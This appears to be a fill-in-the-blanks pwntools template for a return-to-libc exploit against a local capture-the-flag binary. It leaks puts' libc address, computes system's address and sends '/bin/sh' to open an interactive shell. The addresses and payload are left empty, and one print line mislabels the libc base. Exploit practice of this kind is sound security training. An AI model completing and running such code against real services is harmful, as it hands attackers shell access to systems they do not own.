#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *

target = process("./chall")

# address
puts_plt = 
puts_got = 
gets_plt = 

pop1ret = 

libc_puts_off = 
libc_system_off = 

# payload 
payload = b"A" * 
payload += 

_ = target.readline()
target.sendline(payload)
_ = target.readline()

libc_puts_addr = u32(target.readline()[0:4])
print("[*] libc_puts_addr : 0x{:x}\n".format(libc_puts_addr))

libc_base_addr = 
libc_system_addr = 

print("[*] libc_puts_addr : 0x{:x}\n".format(libc_base_addr))

target.sendline(p32(libc_system_addr) + b"/bin/sh\x00")


target.interactive()
